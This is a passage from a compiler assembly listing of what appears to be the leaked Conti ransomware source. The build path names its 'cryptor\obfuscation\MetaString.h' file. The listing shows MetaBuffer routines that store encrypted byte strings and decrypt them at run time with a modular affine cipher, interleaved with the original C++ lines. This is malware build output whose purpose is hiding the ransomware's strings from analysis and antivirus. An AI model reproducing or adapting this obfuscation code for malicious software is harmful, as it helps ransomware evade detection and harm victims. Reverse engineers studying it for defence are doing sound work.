?decrypt@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 27	 mov	 BYTE PTR [rcx+1], 39	; 00000027H
  00007	c6 41 02 38	 mov	 BYTE PTR [rcx+2], 56	; 00000038H
  0000b	c6 41 03 14	 mov	 BYTE PTR [rcx+3], 20
  0000f	c6 41 04 38	 mov	 BYTE PTR [rcx+4], 56	; 00000038H
  00013	c6 41 05 04	 mov	 BYTE PTR [rcx+5], 4
  00017	c6 41 06 38	 mov	 BYTE PTR [rcx+6], 56	; 00000038H
  0001b	c6 41 07 19	 mov	 BYTE PTR [rcx+7], 25
  0001f	c6 41 08 38	 mov	 BYTE PTR [rcx+8], 56	; 00000038H
  00023	c6 41 09 14	 mov	 BYTE PTR [rcx+9], 20
  00027	c6 41 0a 38	 mov	 BYTE PTR [rcx+10], 56	; 00000038H
  0002b	c6 41 0b 6f	 mov	 BYTE PTR [rcx+11], 111	; 0000006fH
  0002f	c6 41 0c 38	 mov	 BYTE PTR [rcx+12], 56	; 00000038H
  00033	c6 41 0d 23	 mov	 BYTE PTR [rcx+13], 35	; 00000023H
  00037	c6 41 0e 38	 mov	 BYTE PTR [rcx+14], 56	; 00000038H
  0003b	c6 41 0f 74	 mov	 BYTE PTR [rcx+15], 116	; 00000074H
  0003f	c6 41 10 38	 mov	 BYTE PTR [rcx+16], 56	; 00000038H
  00043	c6 41 11 67	 mov	 BYTE PTR [rcx+17], 103	; 00000067H
  00047	c6 41 12 38	 mov	 BYTE PTR [rcx+18], 56	; 00000038H
  0004b	c6 41 13 56	 mov	 BYTE PTR [rcx+19], 86	; 00000056H
  0004f	c6 41 14 38	 mov	 BYTE PTR [rcx+20], 56	; 00000038H
  00053	c6 41 15 79	 mov	 BYTE PTR [rcx+21], 121	; 00000079H
  00057	c6 41 16 38	 mov	 BYTE PTR [rcx+22], 56	; 00000038H
  0005b	c6 41 17 04	 mov	 BYTE PTR [rcx+23], 4
  0005f	c6 41 18 38	 mov	 BYTE PTR [rcx+24], 56	; 00000038H
  00063	c6 41 19 19	 mov	 BYTE PTR [rcx+25], 25
  00067	c6 41 1a 38	 mov	 BYTE PTR [rcx+26], 56	; 00000038H
  0006b	c6 41 1b 7e	 mov	 BYTE PTR [rcx+27], 126	; 0000007eH
  0006f	c6 41 1c 38	 mov	 BYTE PTR [rcx+28], 56	; 00000038H
  00073	c6 41 1d 32	 mov	 BYTE PTR [rcx+29], 50	; 00000032H
  00077	c6 41 1e 38	 mov	 BYTE PTR [rcx+30], 56	; 00000038H
  0007b	c6 41 1f 67	 mov	 BYTE PTR [rcx+31], 103	; 00000067H
  0007f	c6 41 20 38	 mov	 BYTE PTR [rcx+32], 56	; 00000038H
  00083	c6 41 21 60	 mov	 BYTE PTR [rcx+33], 96	; 00000060H
  00087	c6 41 22 38	 mov	 BYTE PTR [rcx+34], 56	; 00000038H
  0008b	c6 41 23 23	 mov	 BYTE PTR [rcx+35], 35	; 00000023H
  0008f	c6 41 24 38	 mov	 BYTE PTR [rcx+36], 56	; 00000038H
  00093	c6 41 25 67	 mov	 BYTE PTR [rcx+37], 103	; 00000067H
  00097	c6 41 26 38	 mov	 BYTE PTR [rcx+38], 56	; 00000038H
  0009b	c6 41 27 56	 mov	 BYTE PTR [rcx+39], 86	; 00000056H
  0009f	c6 41 28 38	 mov	 BYTE PTR [rcx+40], 56	; 00000038H
  000a3	c6 41 29 32	 mov	 BYTE PTR [rcx+41], 50	; 00000032H
  000a7	c6 41 2a 38	 mov	 BYTE PTR [rcx+42], 56	; 00000038H
  000ab	c6 41 2b 04	 mov	 BYTE PTR [rcx+43], 4
  000af	c6 41 2c 38	 mov	 BYTE PTR [rcx+44], 56	; 00000038H
  000b3	c6 41 2d 19	 mov	 BYTE PTR [rcx+45], 25
  000b7	c6 41 2e 38	 mov	 BYTE PTR [rcx+46], 56	; 00000038H
  000bb	c6 41 2f 79	 mov	 BYTE PTR [rcx+47], 121	; 00000079H
  000bf	c6 41 30 38	 mov	 BYTE PTR [rcx+48], 56	; 00000038H
  000c3	c6 41 31 67	 mov	 BYTE PTR [rcx+49], 103	; 00000067H
  000c7	c6 41 32 38	 mov	 BYTE PTR [rcx+50], 56	; 00000038H
  000cb	c6 41 33 1b	 mov	 BYTE PTR [rcx+51], 27
  000cf	c6 41 34 38	 mov	 BYTE PTR [rcx+52], 56	; 00000038H
  000d3	c6 41 35 56	 mov	 BYTE PTR [rcx+53], 86	; 00000056H
  000d7	c6 41 36 38	 mov	 BYTE PTR [rcx+54], 56	; 00000038H
  000db	c6 41 37 44	 mov	 BYTE PTR [rcx+55], 68	; 00000044H
  000df	c6 41 38 38	 mov	 BYTE PTR [rcx+56], 56	; 00000038H
  000e3	c6 41 39 38	 mov	 BYTE PTR [rcx+57], 56	; 00000038H
  000e7	c6 41 3a 38	 mov	 BYTE PTR [rcx+58], 56	; 00000038H
  000eb	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  000ef	48 8b c1	 mov	 rax, rcx
  000f2	c3		 ret	 0
??0?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 20 00 00
	00		 mov	 r11d, 32		; 00000020H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 75	 sub	 ecx, 117		; 00000075H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 25	 imul	 r8d, ecx, 37		; 00000025H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 58	 mov	 BYTE PTR [rcx+1], 88	; 00000058H
  00007	c6 41 02 75	 mov	 BYTE PTR [rcx+2], 117	; 00000075H
  0000b	c6 41 03 78	 mov	 BYTE PTR [rcx+3], 120	; 00000078H
  0000f	c6 41 04 75	 mov	 BYTE PTR [rcx+4], 117	; 00000075H
  00013	c6 41 05 67	 mov	 BYTE PTR [rcx+5], 103	; 00000067H
  00017	c6 41 06 75	 mov	 BYTE PTR [rcx+6], 117	; 00000075H
  0001b	c6 41 07 11	 mov	 BYTE PTR [rcx+7], 17
  0001f	c6 41 08 75	 mov	 BYTE PTR [rcx+8], 117	; 00000075H
  00023	c6 41 09 03	 mov	 BYTE PTR [rcx+9], 3
  00027	c6 41 0a 75	 mov	 BYTE PTR [rcx+10], 117	; 00000075H
  0002b	c6 41 0b 6f	 mov	 BYTE PTR [rcx+11], 111	; 0000006fH
  0002f	c6 41 0c 75	 mov	 BYTE PTR [rcx+12], 117	; 00000075H
  00033	c6 41 0d 18	 mov	 BYTE PTR [rcx+13], 24
  00037	c6 41 0e 75	 mov	 BYTE PTR [rcx+14], 117	; 00000075H
  0003b	c6 41 0f 22	 mov	 BYTE PTR [rcx+15], 34	; 00000022H
  0003f	c6 41 10 75	 mov	 BYTE PTR [rcx+16], 117	; 00000075H
  00043	c6 41 11 4b	 mov	 BYTE PTR [rcx+17], 75	; 0000004bH
  00047	c6 41 12 75	 mov	 BYTE PTR [rcx+18], 117	; 00000075H
  0004b	c6 41 13 30	 mov	 BYTE PTR [rcx+19], 48	; 00000030H
  0004f	c6 41 14 75	 mov	 BYTE PTR [rcx+20], 117	; 00000075H
  00053	c6 41 15 6a	 mov	 BYTE PTR [rcx+21], 106	; 0000006aH
  00057	c6 41 16 75	 mov	 BYTE PTR [rcx+22], 117	; 00000075H
  0005b	c6 41 17 6f	 mov	 BYTE PTR [rcx+23], 111	; 0000006fH
  0005f	c6 41 18 75	 mov	 BYTE PTR [rcx+24], 117	; 00000075H
  00063	c6 41 19 76	 mov	 BYTE PTR [rcx+25], 118	; 00000076H
  00067	c6 41 1a 75	 mov	 BYTE PTR [rcx+26], 117	; 00000075H
  0006b	c6 41 1b 18	 mov	 BYTE PTR [rcx+27], 24
  0006f	c6 41 1c 75	 mov	 BYTE PTR [rcx+28], 117	; 00000075H
  00073	c6 41 1d 1d	 mov	 BYTE PTR [rcx+29], 29
  00077	c6 41 1e 75	 mov	 BYTE PTR [rcx+30], 117	; 00000075H
  0007b	c6 41 1f 75	 mov	 BYTE PTR [rcx+31], 117	; 00000075H
  0007f	c6 41 20 75	 mov	 BYTE PTR [rcx+32], 117	; 00000075H
  00083	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00087	48 8b c1	 mov	 rax, rcx
  0008a	c3		 ret	 0
??0?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 04 00 00
	00		 mov	 r10d, 4
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 7a 00 00 00	 mov	 eax, 122		; 0000007aH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 18	 mov	 BYTE PTR [rcx+1], 24
  00007	c6 41 02 7a	 mov	 BYTE PTR [rcx+2], 122	; 0000007aH
  0000b	c6 41 03 7a	 mov	 BYTE PTR [rcx+3], 122	; 0000007aH
  0000f	c6 41 04 7a	 mov	 BYTE PTR [rcx+4], 122	; 0000007aH
  00013	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00017	48 8b c1	 mov	 rax, rcx
  0001a	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 06 00 00
	00		 mov	 r10d, 6
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 1d 00 00 00	 mov	 eax, 29
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
